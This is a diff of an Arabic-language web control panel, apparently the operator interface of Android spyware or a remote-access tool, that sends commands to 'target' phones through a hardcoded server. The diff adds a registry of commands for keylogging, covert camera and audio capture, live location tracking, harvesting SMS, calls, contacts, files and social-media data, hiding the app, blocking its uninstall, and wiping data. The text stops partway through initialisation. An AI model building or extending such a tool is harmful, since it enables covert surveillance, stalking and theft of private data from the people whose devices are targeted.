@@ -4,14 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#0f172a">
-    <meta name="apple-mobile-web-app-capable" content="yes">
     <title>أبو الزهراء</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
@@ -19,47 +14,43 @@
             min-height: 100vh;
             color: white;
             padding: 16px;
+            padding-bottom: 80px;
         }
         
         .header {
             display: flex;
             align-items: center;
             gap: 12px;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
             padding-bottom: 16px;
             border-bottom: 1px solid #334155;
         }
         
         .logo {
-            width: 48px;
-            height: 48px;
+            width: 50px;
+            height: 50px;
             background: linear-gradient(135deg, #dc2626, #991b1b);
-            border-radius: 12px;
+            border-radius: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
+            font-size: 26px;
+            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.3);
         }
         
-        .title {
-            font-size: 20px;
-            font-weight: bold;
-        }
-        
-        .subtitle {
-            font-size: 12px;
-            color: #94a3b8;
-        }
+        .title { font-size: 22px; font-weight: bold; }
+        .subtitle { font-size: 11px; color: #94a3b8; }
         
         .connection-status {
             margin-right: auto;
             display: flex;
             align-items: center;
             gap: 6px;
-            font-size: 12px;
-            padding: 4px 10px;
+            font-size: 11px;
+            padding: 4px 12px;
             border-radius: 20px;
-            background: rgba(15, 23, 42, 0.5);
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid #334155;
         }
         
         .status-dot {
@@ -67,18 +58,23 @@
             height: 8px;
             border-radius: 50%;
             background: #22c55e;
+            animation: pulse 2s infinite;
         }
         
-        .status-dot.offline {
-            background: #ef4444;
+        .status-dot.offline { background: #ef4444; animation: none; }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
         
         .card {
-            background: rgba(30, 41, 59, 0.5);
+            background: rgba(30, 41, 59, 0.6);
             border-radius: 16px;
             padding: 16px;
             margin-bottom: 16px;
             border: 1px solid #334155;
+            backdrop-filter: blur(10px);
         }
         
         .card-title {
@@ -93,88 +89,57 @@
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
+            gap: 10px;
         }
         
         .stat-card {
-            background: rgba(15, 23, 42, 0.5);
+            background: rgba(15, 23, 42, 0.6);
             border-radius: 12px;
-            padding: 12px;
+            padding: 14px;
             text-align: center;
+            border: 1px solid #334155;
         }
         
         .stat-value {
             font-size: 28px;
             font-weight: bold;
-            color: #dc2626;
+            background: linear-gradient(135deg, #dc2626, #f87171);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
         
-        .stat-label {
-            font-size: 12px;
-            color: #94a3b8;
-        }
-        
-        .device-card {
-            background: rgba(15, 23, 42, 0.5);
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            cursor: pointer;
-            border: 1px solid transparent;
-            transition: all 0.2s;
-        }
-        
-        .device-card.selected {
-            border-color: #dc2626;
-            background: rgba(220, 38, 38, 0.1);
-        }
-        
-        .device-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .device-status {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #22c55e;
-        }
-        
-        .device-status.offline {
-            background: #ef4444;
-        }
+        .stat-label { font-size: 11px; color: #94a3b8; margin-top: 4px; }
         
         .btn {
             background: linear-gradient(135deg, #dc2626, #991b1b);
             color: white;
             border: none;
-            padding: 12px 24px;
+            padding: 14px 24px;
             border-radius: 12px;
             font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
             width: 100%;
-            margin-top: 8px;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: transform 0.2s, box-shadow 0.2s;
         }
         
-        .btn:active {
-            transform: scale(0.98);
-        }
+        .btn:active { transform: scale(0.98); }
         
         .btn-outline {
             background: transparent;
-            border: 1px solid #dc2626;
+            border: 2px solid #dc2626;
             color: #dc2626;
         }
         
-        .btn-secondary {
-            background: rgba(15, 23, 42, 0.5);
-            border: 1px solid #334155;
-        }
+        .btn-success { background: linear-gradient(135deg, #16a34a, #15803d); }
+        .btn-warning { background: linear-gradient(135deg, #d97706, #b45309); }
+        .btn-secondary { background: rgba(15, 23, 42, 0.8); border: 1px solid #334155; }
         
         .quick-actions {
             display: grid;
@@ -183,13 +148,13 @@
         }
         
         .action-btn {
-            background: rgba(15, 23, 42, 0.5);
+            background: rgba(15, 23, 42, 0.6);
             border: 1px solid #334155;
             border-radius: 12px;
-            padding: 12px 8px;
+            padding: 12px 6px;
             color: white;
             text-align: center;
-            font-size: 12px;
+            font-size: 11px;
             cursor: pointer;
             transition: all 0.2s;
         }
@@ -199,129 +164,240 @@
             border-color: #dc2626;
         }
         
-        .action-btn.pending {
-            opacity: 0.6;
-            pointer-events: none;
+        .action-btn.pending { opacity: 0.5; pointer-events: none; }
+        .action-icon { font-size: 22px; margin-bottom: 4px; }
+        
+        .device-card {
+            background: rgba(15, 23, 42, 0.6);
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.2s;
         }
         
-        .action-icon {
-            font-size: 20px;
-            margin-bottom: 4px;
+        .device-card.selected {
+            border-color: #dc2626;
+            background: rgba(220, 38, 38, 0.1);
         }
         
-        .input-group {
-            margin-bottom: 12px;
+        .device-info { display: flex; align-items: center; gap: 12px; }
+        
+        .device-status {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #22c55e;
+            box-shadow: 0 0 8px #22c55e;
         }
         
-        .input-group label {
-            display: block;
-            font-size: 12px;
+        .device-status.offline { background: #ef4444; box-shadow: 0 0 8px #ef4444; }
+        
+        .tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+            overflow-x: auto;
+            padding-bottom: 8px;
+        }
+        
+        .tab {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid #334155;
+            border-radius: 10px;
+            padding: 10px 16px;
             color: #94a3b8;
-            margin-bottom: 4px;
+            font-size: 13px;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.2s;
+        }
+        
+        .tab.active {
+            background: linear-gradient(135deg, #dc2626, #991b1b);
+            color: white;
+            border-color: transparent;
         }
         
         .input {
             width: 100%;
-            background: rgba(15, 23, 42, 0.5);
+            background: rgba(15, 23, 42, 0.8);
             border: 1px solid #334155;
-            border-radius: 8px;
-            padding: 12px;
+            border-radius: 10px;
+            padding: 14px;
             color: white;
             font-size: 14px;
+            margin-bottom: 10px;
         }
+        
+        .input:focus { border-color: #dc2626; outline: none; }
+        
+        .link-code {
+            background: linear-gradient(135deg, #1e40af, #1d4ed8);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .link-code-value {
+            font-size: 36px;
+            font-weight: bold;
+            letter-spacing: 8px;
+            margin: 10px 0;
+            font-family: monospace;
+        }
+        
+        .link-code-info {
+            font-size: 12px;
+            color: #93c5fd;
+            margin-top: 8px;
+        }
+        
+        .hidden { display: none !important; }
         
         .loading {
             display: flex;
             justify-content: center;
-            padding: 24px;
+            padding: 32px;
         }
         
         .spinner {
-            width: 32px;
-            height: 32px;
-            border: 3px solid #334155;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #334155;
             border-top-color: #dc2626;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
         
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .hidden {
-            display: none;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
         
         .offline-banner {
             background: linear-gradient(135deg, #f59e0b, #d97706);
             color: white;
-            padding: 10px 16px;
-            border-radius: 8px;
+            padding: 12px 16px;
+            border-radius: 10px;
             margin-bottom: 16px;
             display: flex;
             align-items: center;
+            gap: 10px;
+            font-size: 13px;
+        }
+        
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
             gap: 8px;
-            font-size: 14px;
         }
         
-        .cached-badge {
-            background: rgba(34, 197, 94, 0.2);
-            color: #22c55e;
-            padding: 2px 8px;
+        .command-btn {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid #334155;
             border-radius: 10px;
-            font-size: 10px;
-            margin-right: 8px;
-        }
-        
-        .auto-refresh {
+            padding: 12px;
+            color: white;
+            text-align: right;
+            font-size: 12px;
+            cursor: pointer;
             display: flex;
             align-items: center;
             gap: 8px;
-            font-size: 12px;
+            transition: all 0.2s;
+        }
+        
+        .command-btn:active {
+            background: rgba(220, 38, 38, 0.2);
+            border-color: #dc2626;
+        }
+        
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 16px;
+        }
+        
+        .modal-content {
+            background: #1e293b;
+            border-radius: 16px;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            max-height: 80vh;
+            overflow-y: auto;
+            border: 1px solid #334155;
+        }
+        
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+        
+        .modal-close {
+            background: none;
+            border: none;
             color: #94a3b8;
-            margin-top: 8px;
-        }
-        
-        .switch {
-            position: relative;
-            width: 40px;
-            height: 20px;
-            background: #334155;
-            border-radius: 20px;
+            font-size: 24px;
             cursor: pointer;
-            transition: background 0.3s;
         }
         
-        .switch.active {
-            background: #dc2626;
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: space-around;
+            padding: 12px 0;
+            border-top: 1px solid #334155;
         }
         
-        .switch::after {
-            content: '';
-            position: absolute;
-            top: 2px;
-            left: 2px;
-            width: 16px;
-            height: 16px;
-            background: white;
-            border-radius: 50%;
-            transition: transform 0.3s;
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: #64748b;
+            font-size: 10px;
+            cursor: pointer;
+            padding: 8px 16px;
+            border-radius: 8px;
+            transition: all 0.2s;
         }
         
-        .switch.active::after {
-            transform: translateX(20px);
-        }
+        .nav-item.active { color: #dc2626; background: rgba(220, 38, 38, 0.1); }
+        .nav-item-icon { font-size: 22px; }
+        
+        .section { display: none; }
+        .section.active { display: block; }
     </style>
 </head>
 <body>
+    <!-- Header -->
     <div class="header">
         <div class="logo">🛡️</div>
         <div>
             <div class="title">أبو الزهراء</div>
-            <div class="subtitle" id="version">v2.0 - يعمل بلا إنترنت</div>
+            <div class="subtitle" id="version">v2.0 - لوحة التحكم المتكاملة</div>
         </div>
-        <div class="connection-status" id="connection-status">
+        <div class="connection-status">
             <div class="status-dot" id="status-dot"></div>
             <span id="status-text">متصل</span>
         </div>
@@ -330,32 +406,14 @@
     <!-- Offline Banner -->
     <div id="offline-banner" class="offline-banner hidden">
         <span>⚠️</span>
-        <span>وضع عدم الاتصال - البيانات محفوظة محلياً</span>
+        <span>وضع عدم الاتصال - الأوامر محفوظة وستُرسل تلقائياً</span>
     </div>
     
-    <!-- Server Configuration -->
-    <div id="config-screen" class="card">
-        <div class="card-title">⚙️ إعداد الخادم</div>
-        <div class="input-group">
-            <label>رابط الخادم (Server URL)</label>
-            <input type="url" id="server-url" class="input" placeholder="https://your-server.com">
-        </div>
-        <button class="btn" onclick="connectToServer()">🔗 اتصال</button>
-        <button class="btn btn-outline" onclick="testConnection()">🔍 اختبار الاتصال</button>
-        <div class="auto-refresh">
-            <div class="switch active" id="auto-connect-switch" onclick="toggleAutoConnect()"></div>
-            <span>اتصال تلقائي عند فتح التطبيق</span>
-        </div>
-    </div>
-    
-    <!-- Main Dashboard -->
-    <div id="dashboard" class="hidden">
+    <!-- Main Section -->
+    <div id="main-section" class="section active">
         <!-- Stats -->
         <div class="card">
-            <div class="card-title">
-                📊 الإحصائيات
-                <span class="cached-badge" id="cached-badge" style="display: none;">محفوظة</span>
-            </div>
+            <div class="card-title">📊 الإحصائيات</div>
             <div class="stats-grid">
                 <div class="stat-card">
                     <div class="stat-value" id="devices-count">0</div>
@@ -376,203 +434,314 @@
             </div>
         </div>
         
+        <!-- Link Device -->
+        <div class="card">
+            <div class="card-title">🔗 ربط جهاز جديد</div>
+            <button class="btn btn-success" onclick="generateLinkCode()">
+                <span>🔑</span> توليد كود الربط
+            </button>
+            <div id="link-code-container" class="link-code hidden">
+                <div>كود الربط:</div>
+                <div class="link-code-value" id="link-code-value">------</div>
+                <div class="link-code-info">أدخل هذا الكود في التطبيق المستهدف للربط</div>
+            </div>
+        </div>
+        
         <!-- Quick Actions -->
         <div class="card">
             <div class="card-title">⚡ إجراءات سريعة</div>
             <div class="quick-actions" id="quick-actions">
-                <div class="action-btn" data-cmd="get_location" onclick="sendCommand('get_location')">
-                    <div class="action-icon">📍</div>
-                    الموقع
-                </div>
-                <div class="action-btn" data-cmd="screenshot" onclick="sendCommand('screenshot')">
-                    <div class="action-icon">📷</div>
-                    لقطة
-                </div>
-                <div class="action-btn" data-cmd="get_battery" onclick="sendCommand('get_battery')">
-                    <div class="action-icon">🔋</div>
-                    البطارية
-                </div>
-                <div class="action-btn" data-cmd="ring" onclick="sendCommand('ring')">
-                    <div class="action-icon">🔔</div>
-                    رنين
-                </div>
-                <div class="action-btn" data-cmd="get_contacts" onclick="sendCommand('get_contacts')">
-                    <div class="action-icon">👥</div>
-                    جهات
-                </div>
-                <div class="action-btn" data-cmd="get_sms" onclick="sendCommand('get_sms')">
-                    <div class="action-icon">💬</div>
-                    رسائل
-                </div>
-                <div class="action-btn" data-cmd="get_calls" onclick="sendCommand('get_calls')">
-                    <div class="action-icon">📞</div>
-                    مكالمات
-                </div>
-                <div class="action-btn" data-cmd="get_info" onclick="sendCommand('get_info')">
-                    <div class="action-icon">ℹ️</div>
-                    معلومات
-                </div>
+                <div class="action-btn" onclick="sendCommand('get_location')"><div class="action-icon">📍</div>الموقع</div>
+                <div class="action-btn" onclick="sendCommand('screenshot')"><div class="action-icon">📸</div>لقطة</div>
+                <div class="action-btn" onclick="sendCommand('get_battery')"><div class="action-icon">🔋</div>البطارية</div>
+                <div class="action-btn" onclick="sendCommand('ring')"><div class="action-icon">🔔</div>رنين</div>
+                <div class="action-btn" onclick="sendCommand('get_contacts')"><div class="action-icon">📇</div>جهات</div>
+                <div class="action-btn" onclick="sendCommand('get_sms')"><div class="action-icon">📲</div>رسائل</div>
+                <div class="action-btn" onclick="sendCommand('get_calls')"><div class="action-icon">📞</div>مكالمات</div>
+                <div class="action-btn" onclick="sendCommand('get_info')"><div class="action-icon">ℹ️</div>معلومات</div>
             </div>
         </div>
         
         <!-- Devices List -->
         <div class="card">
-            <div class="card-title">📱 الأجهزة</div>
+            <div class="card-title">📱 الأجهزة المربوطة</div>
             <div id="devices-list">
                 <div class="loading"><div class="spinner"></div></div>
             </div>
         </div>
+    </div>
+    
+    <!-- Commands Section -->
+    <div id="commands-section" class="section">
+        <div class="card">
+            <div class="card-title">📋 التصنيفات</div>
+            <div class="tabs" id="category-tabs">
+                <div class="tab active" data-cat="data" onclick="selectCategory('data')">📊 البيانات</div>
+                <div class="tab" data-cat="control" onclick="selectCategory('control')">🎮 التحكم</div>
+                <div class="tab" data-cat="monitor" onclick="selectCategory('monitor')">🔍 المراقبة</div>
+                <div class="tab" data-cat="files" onclick="selectCategory('files')">📂 الملفات</div>
+                <div class="tab" data-cat="apps" onclick="selectCategory('apps')">📦 التطبيقات</div>
+                <div class="tab" data-cat="security" onclick="selectCategory('security')">🔒 الأمان</div>
+                <div class="tab" data-cat="social" onclick="selectCategory('social')">🌐 التواصل</div>
+                <div class="tab" data-cat="syssettings" onclick="selectCategory('syssettings')">⚙️ النظام</div>
+            </div>
+            <div id="commands-list" class="command-grid"></div>
+        </div>
+    </div>
+    
+    <!-- Monitor Section -->
+    <div id="monitor-section" class="section">
+        <div class="card">
+            <div class="card-title">📍 تتبع الموقع</div>
+            <button class="btn btn-success" onclick="sendCommand('location_live')">
+                <span>🗺️</span> بدء التتبع المباشر
+            </button>
+            <button class="btn btn-secondary" onclick="sendCommand('location_stop')">
+                <span>⏹️</span> إيقاف التتبع
+            </button>
+            <button class="btn btn-secondary" onclick="sendCommand('get_location_history')">
+                <span>📜</span> سجل المواقع
+            </button>
+        </div>
         
-        <!-- Actions -->
-        <button class="btn btn-secondary" onclick="refreshData()">🔄 تحديث</button>
-        <button class="btn btn-outline" onclick="showConfig()">⚙️ إعادة الإعداد</button>
+        <div class="card">
+            <div class="card-title">⌨️ تسجيل المفاتيح</div>
+            <button class="btn btn-success" onclick="sendCommand('keylogger_start')">
+                <span>▶️</span> بدء التسجيل
+            </button>
+            <button class="btn btn-secondary" onclick="sendCommand('keylogger_stop')">
+                <span>⏹️</span> إيقاف التسجيل
+            </button>
+            <button class="btn btn-secondary" onclick="sendCommand('get_keylogger')">
+                <span>📥</span> جلب البيانات
+            </button>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">🎬 تسجيل الشاشة</div>
+            <button class="btn btn-success" onclick="sendCommand('screen_record_start')">
+                <span>🔴</span> بدء التسجيل
+            </button>
+            <button class="btn btn-secondary" onclick="sendCommand('stop_screen')">
+                <span>⏹️</span> إيقاف التسجيل
+            </button>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">📷 الكاميرا</div>
+            <button class="btn" onclick="sendCommand('front_camera')">
+                <span>🤳</span> كاميرا أمامية
+            </button>
+            <button class="btn btn-secondary" onclick="sendCommand('back_camera')">
+                <span>📷</span> كاميرا خلفية
+            </button>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">🎙️ التسجيل الصوتي</div>
+            <button class="btn" onclick="sendCommand('record_audio')">
+                <span>🎙️</span> تسجيل صوتي
+            </button>
+        </div>
+    </div>
+    
+    <!-- Settings Section -->
+    <div id="settings-section" class="section">
+        <div class="card">
+            <div class="card-title">⚙️ إعدادات الخادم</div>
+            <input type="url" class="input" id="server-url-input" placeholder="رابط الخادم">
+            <button class="btn" onclick="saveServerUrl()">💾 حفظ الإعدادات</button>
+            <button class="btn btn-secondary" onclick="testConnection()">🔍 اختبار الاتصال</button>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">📊 معلومات التطبيق</div>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value">200+</div>
+                    <div class="stat-label">أمر متاح</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">8</div>
+                    <div class="stat-label">تصنيفات</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">🔄 تحديث البيانات</div>
+            <button class="btn" onclick="refreshAllData()">🔄 تحديث الآن</button>
+            <button class="btn btn-secondary" onclick="clearCache()">🗑️ مسح الكاش</button>
+        </div>
+    </div>
+    
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <div class="nav-item active" data-section="main" onclick="showSection('main')">
+            <div class="nav-item-icon">🏠</div>
+            <div>الرئيسية</div>
+        </div>
+        <div class="nav-item" data-section="commands" onclick="showSection('commands')">
+            <div class="nav-item-icon">📋</div>
+            <div>الأوامر</div>
+        </div>
+        <div class="nav-item" data-section="monitor" onclick="showSection('monitor')">
+            <div class="nav-item-icon">🔍</div>
+            <div>المراقبة</div>
+        </div>
+        <div class="nav-item" data-section="settings" onclick="showSection('settings')">
+            <div class="nav-item-icon">⚙️</div>
+            <div>الإعدادات</div>
+        </div>
     </div>
     
     <script>
-        // Configuration
-        const DEFAULT_SERVER = 'https://alsydyabwalzhra.online';
+        // ==================== Configuration ====================
+        const SERVER_URL = 'https://alsydyabwalzhra.online';
         const CACHE_KEY = 'abu_zahra_cache';
         const SETTINGS_KEY = 'abu_zahra_settings';
         
-        // State
-        let serverUrl = '';
+        // ==================== Command Registry ====================
+        const COMMANDS = {
+            data: [
+                { cmd: 'get_sms', desc: 'جلب الرسائل', emoji: '📲' },
+                { cmd: 'get_calls', desc: 'سجل المكالمات', emoji: '📞' },
+                { cmd: 'get_contacts', desc: 'جهات الاتصال', emoji: '📇' },
+                { cmd: 'get_location', desc: 'الموقع الجغرافي', emoji: '📍' },
+                { cmd: 'get_notifications', desc: 'الإشعارات', emoji: '🔔' },
+                { cmd: 'get_apps', desc: 'التطبيقات', emoji: '📱' },
+                { cmd: 'get_info', desc: 'معلومات الجهاز', emoji: 'ℹ️' },
+                { cmd: 'get_battery', desc: 'حالة البطارية', emoji: '🔋' },
+                { cmd: 'get_gallery', desc: 'المعرض', emoji: '🖼️' },
+                { cmd: 'get_clipboard', desc: 'الحافظة', emoji: '📋' },
+                { cmd: 'get_wifi_info', desc: 'معلومات WiFi', emoji: '📶' },
+                { cmd: 'get_bluetooth', desc: 'البلوتوث', emoji: '🔵' },
+                { cmd: 'get_network_info', desc: 'الشبكة', emoji: '🌐' },
+                { cmd: 'get_sim_info', desc: 'الشريحة', emoji: '📱' },
+                { cmd: 'get_storage_info', desc: 'التخزين', emoji: '💾' },
+                { cmd: 'get_calendar', desc: 'التقويم', emoji: '📅' },
+                { cmd: 'get_browser_history', desc: 'سجل المتصفح', emoji: '🌍' },
+                { cmd: 'get_all', desc: 'جميع البيانات', emoji: '📥' },
+            ],
+            control: [
+                { cmd: 'ping', desc: 'فحص الاتصال', emoji: '📡' },
+                { cmd: 'vibrate', desc: 'اهتزاز', emoji: '📳' },
+                { cmd: 'ring', desc: 'رنين', emoji: '🔔' },
+                { cmd: 'screenshot', desc: 'لقطة شاشة', emoji: '📸' },
+                { cmd: 'front_camera', desc: 'كاميرا أمامية', emoji: '📷' },
+                { cmd: 'back_camera', desc: 'كاميرا خلفية', emoji: '📷' },
+                { cmd: 'record_audio', desc: 'تسجيل صوتي', emoji: '🎙️' },
+                { cmd: 'lock_phone', desc: 'قفل الهاتف', emoji: '🔒' },
+                { cmd: 'reboot', desc: 'إعادة تشغيل', emoji: '🔄' },
+                { cmd: 'enable_wifi', desc: 'تشغيل WiFi', emoji: '📶' },
+                { cmd: 'disable_wifi', desc: 'إيقاف WiFi', emoji: '📵' },
+                { cmd: 'enable_bluetooth', desc: 'تشغيل البلوتوث', emoji: '🔵' },
+                { cmd: 'disable_bluetooth', desc: 'إيقاف البلوتوث', emoji: '❌' },
+                { cmd: 'airplane_on', desc: 'وضع الطيران', emoji: '✈️' },
+                { cmd: 'airplane_off', desc: 'إيقاف الطيران', emoji: '📱' },
+                { cmd: 'torch_on', desc: 'تشغيل الكشاف', emoji: '🔦' },
+                { cmd: 'torch_off', desc: 'إطفاء الكشاف', emoji: '🔦' },
+                { cmd: 'send_sms', desc: 'إرسال رسالة', emoji: '📲' },
+                { cmd: 'make_call', desc: 'إجراء مكالمة', emoji: '📞' },
+                { cmd: 'open_url', desc: 'فتح رابط', emoji: '🌐' },
+            ],
+            monitor: [
+                { cmd: 'keylogger_start', desc: 'بدء تسجيل المفاتيح', emoji: '⌨️' },
+                { cmd: 'keylogger_stop', desc: 'إيقاف التسجيل', emoji: '⏹️' },
+                { cmd: 'get_keylogger', desc: 'جلب البيانات', emoji: '📥' },
+                { cmd: 'screen_record_start', desc: 'تسجيل الشاشة', emoji: '🔴' },
+                { cmd: 'stop_screen', desc: 'إيقاف التسجيل', emoji: '⏹️' },
+                { cmd: 'location_live', desc: 'تتبع مباشر', emoji: '🗺️' },
+                { cmd: 'location_stop', desc: 'إيقاف التتبع', emoji: '⏹️' },
+                { cmd: 'get_location_history', desc: 'سجل المواقع', emoji: '📜' },
+                { cmd: 'clipboard_monitor_start', desc: 'مراقبة الحافظة', emoji: '📋' },
+                { cmd: 'sms_monitor', desc: 'مراقبة الرسائل', emoji: '📲' },
+                { cmd: 'call_monitor', desc: 'مراقبة المكالمات', emoji: '📞' },
+            ],
+            files: [
+                { cmd: 'list_files', desc: 'عرض الملفات', emoji: '📂' },
+                { cmd: 'get_file', desc: 'جلب ملف', emoji: '📄' },
+                { cmd: 'download_file', desc: 'تحميل ملف', emoji: '⬇️' },
+                { cmd: 'list_downloads', desc: 'التحميلات', emoji: '📥' },
+                { cmd: 'list_dcim', desc: 'مجلد DCIM', emoji: '📸' },
+                { cmd: 'list_music', desc: 'الموسيقى', emoji: '🎵' },
+                { cmd: 'list_videos', desc: 'الفيديوهات', emoji: '🎬' },
+                { cmd: 'list_documents', desc: 'المستندات', emoji: '📁' },
+                { cmd: 'list_whatsapp', desc: 'ملفات واتساب', emoji: '💬' },
+                { cmd: 'delete_file', desc: 'حذف ملف', emoji: '🗑️' },
+                { cmd: 'send_backup_contacts', desc: 'نسخة الجهات', emoji: '📇' },
+                { cmd: 'send_backup_sms', desc: 'نسخة الرسائل', emoji: '📲' },
+                { cmd: 'send_backup_all', desc: 'نسخة كاملة', emoji: '💾' },
+            ],
+            apps: [
+                { cmd: 'open_app', desc: 'فتح تطبيق', emoji: '📱' },
+                { cmd: 'close_app', desc: 'إغلاق تطبيق', emoji: '❌' },
+                { cmd: 'install_app', desc: 'تثبيت تطبيق', emoji: '📥' },
+                { cmd: 'uninstall_app', desc: 'حذف تطبيق', emoji: '🗑️' },
+                { cmd: 'clear_app_data', desc: 'مسح بيانات', emoji: '🧹' },
+                { cmd: 'force_stop_app', desc: 'إيقاف قسري', emoji: '⛔' },
+                { cmd: 'get_app_usage', desc: 'استخدام التطبيقات', emoji: '📊' },
+                { cmd: 'get_screen_time', desc: 'وقت الشاشة', emoji: '⏱️' },
+            ],
+            security: [
+                { cmd: 'wipe_data', desc: 'مسح البيانات', emoji: '💣' },
+                { cmd: 'factory_reset', desc: 'ضبط المصنع', emoji: '⚠️' },
+                { cmd: 'hide_app', desc: 'إخفاء التطبيق', emoji: '🙈' },
+                { cmd: 'show_app', desc: 'إظهار التطبيق', emoji: '👁️' },
+                { cmd: 'change_passcode', desc: 'تغيير الرمز', emoji: '🔑' },
+                { cmd: 'anti_uninstall_on', desc: 'حماية من الحذف', emoji: '🛡️' },
+                { cmd: 'check_root', desc: 'فحص الروت', emoji: '🧪' },
+            ],
+            social: [
+                { cmd: 'get_whatsapp', desc: 'واتساب', emoji: '💬' },
+                { cmd: 'get_telegram', desc: 'تليجرام', emoji: '✈️' },
+                { cmd: 'get_instagram', desc: 'انستجرام', emoji: '📷' },
+                { cmd: 'get_messenger', desc: 'ماسنجر', emoji: '📘' },
+                { cmd: 'get_snapchat', desc: 'سناب شات', emoji: '👻' },
+                { cmd: 'get_tiktok', desc: 'تيك توك', emoji: '🎵' },
+                { cmd: 'get_twitter', desc: 'تويتر', emoji: '🐦' },
+                { cmd: 'get_facebook', desc: 'فيسبوك', emoji: '📘' },
+            ],
+            syssettings: [
+                { cmd: 'set_language', desc: 'تعيين اللغة', emoji: '🌐' },
+                { cmd: 'set_timezone', desc: 'المنطقة الزمنية', emoji: '🕐' },
+                { cmd: 'set_alarm', desc: 'تعيين منبه', emoji: '⏰' },
+                { cmd: 'enable_dev_mode', desc: 'وضع المطور', emoji: '🔧' },
+                { cmd: 'dns_change', desc: 'تغيير DNS', emoji: '🌐' },
+                { cmd: 'nfc_on', desc: 'تشغيل NFC', emoji: '📡' },
+                { cmd: 'nfc_off', desc: 'إيقاف NFC', emoji: '❌' },
+            ],
+        };
+        
+        // ==================== State ====================
+        let serverUrl = SERVER_URL;
         let selectedDevice = null;
-        let isOnline = navigator.onLine;
+        let isOnline = true;
         let pendingCommands = [];
-        let refreshInterval = null;
-        let autoRefresh = true;
+        let currentCategory = 'data';
         
-        // Cache Manager
-        const CacheManager = {
-            save(key, data) {
-                try {
-                    const cache = this.getAll();
-                    cache[key] = {
-                        data: data,
-                        timestamp: Date.now()
-                    };
-                    localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
-                } catch (e) {
-                    console.error('Cache save error:', e);
-                }
-            },
-            
-            get(key) {
-                try {
-                    const cache = this.getAll();
-                    return cache[key] || null;
-                } catch (e) {
-                    return null;
-                }
-            },
-            
-            getAll() {
-                try {
-                    return JSON.parse(localStorage.getItem(CACHE_KEY) || '{}');
-                } catch (e) {
-                    return {};
-                }
-            },
-            
-            clear() {
-                localStorage.removeItem(CACHE_KEY);
-            }
-        };
-        
-        // Settings Manager
-        const SettingsManager = {
-            get() {
-                try {
-                    return JSON.parse(localStorage.getItem(SETTINGS_KEY) || '{}');
-                } catch (e) {
-                    return {};
-                }
-            },
-            
-            save(settings) {
-                localStorage.setItem(SETTINGS_KEY, JSON.stringify(settings));
-            },
-            
-            getServerUrl() {
-                return this.get().serverUrl || DEFAULT_SERVER;
-            },
-            
-            setServerUrl(url) {
-                const settings = this.get();
-                settings.serverUrl = url;
-                this.save(settings);
-            },
-            
-            isAutoConnect() {
-                return this.get().autoConnect !== false;
-            },
-            
-            setAutoConnect(value) {
-                const settings = this.get();
-                settings.autoConnect = value;
-                this.save(settings);
-            },
-            
-            getLastDevice() {
-                return this.get().lastDevice || null;
-            },
-            
-            setLastDevice(deviceId) {
-                const settings = this.get();
-                settings.lastDevice = deviceId;
-                this.save(settings);
-            }
-        };
-        
-        // Initialize
+        // ==================== Initialize ====================
         document.addEventListener('DOMContentLoaded', () => {
             initApp();
         });
         
         function initApp() {
-            // Load settings
-            serverUrl = SettingsManager.getServerUrl();
